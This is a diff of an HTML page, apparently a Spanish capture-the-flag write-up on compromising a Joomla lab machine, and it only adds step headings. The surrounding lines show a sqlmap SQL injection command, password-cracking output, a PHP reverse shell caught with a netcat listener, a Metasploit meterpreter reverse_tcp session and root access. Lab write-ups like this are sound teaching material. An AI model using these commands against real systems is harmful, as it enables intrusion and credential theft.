@@ -429,6 +429,9 @@
 </span></span><span style="display:flex;"><span>Shellcodes: No Results
 </span></span></code></pre></div><ul>
 <li>Encuentro un posible exploit en <a href="https://www.exploit-db.com/exploits/42033">https://www.exploit-db.com/exploits/42033</a></li>
+</ul>
+<h3 id="paso-3">Paso 3</h3>
+<ul>
 <li>Ataco con SQLi usando sqlmap.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://10.10.53.147/administrator/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
@@ -472,7 +475,8 @@
 </span></span><span style="display:flex;"><span>1g 0:00:00:47 DONE <span style="color:#f92672">(</span>2023-09-03 10:50<span style="color:#f92672">)</span> 0.02120g/s 994.1p/s 994.1c/s 994.1C/s 060494..setsuna
 </span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
 </span></span><span style="display:flex;"><span>Session completed.
-</span></span></code></pre></div><ul>
+</span></span></code></pre></div><h3 id="paso-4">Paso 4</h3>
+<ul>
 <li>Intento subir fichero php para reverse shell sin exito. Buscando en internet encuentro <a href="https://www.hackingarticles.in/joomla-reverse-shell/">https://www.hackingarticles.in/joomla-reverse-shell/</a> asi que modifico un fichero php para lograrlo.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ rlwrap nc -lvnp <span style="color:#ae81ff">1234</span>
@@ -516,7 +520,8 @@
 </span></span><span style="display:flex;"><span>bash-4.2$ chmod +x shell
 </span></span><span style="display:flex;"><span>chmod +x shell
 </span></span><span style="display:flex;"><span>bash-4.2$ ./shell
-</span></span></code></pre></div><ul>
+</span></span></code></pre></div><h3 id="paso-5">Paso 5</h3>
+<ul>
 <li>Abro metasploit y selecciono multihandler exploit y  payload meterpreter/reverse_tcp</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler
@@ -624,7 +629,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/.adasqfiitd/.dnnzjbsapkm
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/.adasqfiitd
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10. -&gt; 10.10.53.147:34132<span style="color:#f92672">)</span> at 2023-09-03 11:38:41 +0200
-</span></span></code></pre></div><ul>
+</span></span></code></pre></div><h3 id="paso-6">Paso 6</h3>
+<ul>
 <li>Obtengo acceso root y busco flags.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid
